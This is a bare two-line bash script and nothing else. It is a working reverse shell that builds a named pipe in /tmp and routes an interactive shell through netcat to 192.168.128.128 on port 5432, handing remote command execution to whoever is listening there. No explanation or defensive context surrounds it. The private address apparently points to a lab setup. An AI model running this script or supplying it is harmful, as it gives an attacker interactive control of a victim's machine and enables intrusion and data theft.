#!/bin/bash
rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 192.168.128.128 5432 > /tmp/f
